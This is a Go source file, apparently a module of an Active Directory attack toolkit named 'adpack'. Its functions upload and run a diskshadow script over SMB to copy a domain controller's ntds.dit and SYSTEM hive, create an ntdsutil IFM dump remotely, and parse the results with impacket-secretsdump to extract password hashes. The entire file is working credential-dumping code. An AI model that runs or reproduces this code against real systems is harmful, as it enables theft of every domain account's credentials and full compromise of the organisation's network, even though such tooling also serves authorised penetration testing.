package modules

import (
	"adpack/utils"
	"fmt"
	"os"
)

type ShadowManager struct{}

func (s *ShadowManager) NTDS(target, user, pass, domain string) error {
	script := `set context persistent nowriters
add volume c: alias adpack
create
expose %adpack% z:
exec cmd /c "copy z:\windows\ntds\ntds.dit c:\windows\temp\ntds.dit"
exec cmd /c "reg save hklm\system c:\windows\temp\system.hive"
`
	utils.Step("Creating diskshadow script...")
	tmpFile, err := os.CreateTemp("", "adpack_ds_*.txt")
	if err != nil {
		return fmt.Errorf("create temp file: %w", err)
	}
	if _, err := tmpFile.WriteString(script); err != nil {
		tmpFile.Close()
		os.Remove(tmpFile.Name())
		return fmt.Errorf("write script: %w", err)
	}
	tmpFile.Close()
	defer os.Remove(tmpFile.Name())

	result := utils.RunCommand("nxc", "smb", target, "-u", user, "-p", pass, "-d", domain, "--put-file", tmpFile.Name(), "C:\\Windows\\Temp\\ds.txt")
	if !result.Success {
		return fmt.Errorf("upload diskshadow script failed: %s", result.Stderr)
	}
	utils.Step("Executing diskshadow...")
	result = utils.RunCommand("nxc", "smb", target, "-u", user, "-p", pass, "-d", domain, "-x", "diskshadow /s C:\\Windows\\Temp\\ds.txt")
	if !result.Success {
		return fmt.Errorf("diskshadow failed: %s", result.Stderr)
	}
	fmt.Println(result.Stdout)
	return nil
}

func (s *ShadowManager) IFM(target, user, pass, domain string) error {
	utils.Step(fmt.Sprintf("Creating IFM media on %s...", target))
	result := utils.RunCommand("nxc", "smb", target, "-u", user, "-p", pass, "-d", domain,
		"-x", "ntdsutil \"activate instance ntds\" \"ifm\" \"create full c:\\windows\\temp\\ifm\" quit quit")
	if !result.Success {
		return fmt.Errorf("ntdsutil IFM failed: %s", result.Stderr)
	}
	fmt.Println(result.Stdout)
	return nil
}

func (s *ShadowManager) Parse(ntdsFile, systemFile string) error {
	utils.Step("Parsing NTDS.dit locally...")
	result := utils.RunCommand("impacket-secretsdump", "-ntds", ntdsFile, "-system", systemFile, "LOCAL")
	if !result.Success {
		return fmt.Errorf("secretsdump parse failed: %s", result.Stderr)
	}
	fmt.Println(result.Stdout)
	return nil
}
